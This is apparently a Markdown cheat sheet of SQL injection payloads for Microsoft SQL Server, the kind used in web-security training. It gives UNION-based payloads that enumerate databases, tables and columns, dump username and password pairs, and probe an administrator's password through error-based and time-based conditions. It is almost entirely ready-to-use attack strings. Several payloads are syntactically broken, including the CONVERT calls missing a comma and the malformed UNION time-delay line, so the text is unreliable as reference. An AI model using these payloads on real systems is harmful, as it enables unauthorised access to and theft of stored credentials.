
### Microsoft SQL (MS SQL)

### Retreaving Database version

```mysql
SELECT @@version
```

**UNION SQLi Context**
```
' UNION SELECT NULL, @@version -- -
```

> **Note:** In UNION Statement we have to match the number of columns of first select statement so that's why we use one NULL in the payload.

### String Concatenation

```
'string1'+'string2'
```

```
SELECT username+password FROM users;
```

**In a UNION SQLi Context**

```
' UNION SELECT NULL,username+":"+password,NULL FROM users -- -
```

### Substring

```
SELECT SUBSTRING(password,2,1) FROM users 
```

**In UNION SQLi context**
```
' UNION SELECT SUBSTRING(password,2,1) FROM users -- -
```

### Comments

```
--comment
/*comment*/
```

### Database Contents

**List All Databases**
```
SELECT name FROM sys.databases
```

**In UNION MS SQLi**
```
' UNION SELECT NULL,name,NULL FROM sys.databases -- -
```

**List All Tables**
```
SELECT table_name FROM information_schema.tables
```

**In a UNION MS SQLi context**

```
' UNION SELECT table_name FROM information_schema.tables -- -
```

**List All Columns**
```
SELECT column_name FROM information_schema.columns WHERE table_name = 'demo'
```

**In UNION MS SQLi**
```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE NAME HERE' -- -
```

### Conditional Errors

```mysql
SELECT CASE WHEN LEN(password) = 3 THEN CONVERT(NVARCHAR 1/0) ELSE '' END FROM users WHERE username='administrator'
```

**In UNION MS SQLi**
```
' UNION SELECT NULL,NULL,CASE WHEN LEN(password)=FUZZ THEN CONVERT(NVARCHAR1/0) ELSE '' END FROM users WHERE username='administrator'
```

### Time delays

```
WAITFOR DELAY '0:0:10'
```

### Conditional Time delays

```
IF (SELECT LEN(password) FROM user WHERE username = 'Administrator') = 5 WAITFOR DELAY '0:0:10'
```

**In UNION MS SQLi**
```
' UNION SELECT NULL,NULL,(SELECT LEN(password) FROM user where username = 'Administrator') = FUZZ WAITFOR DELAY '0:0:5'
```
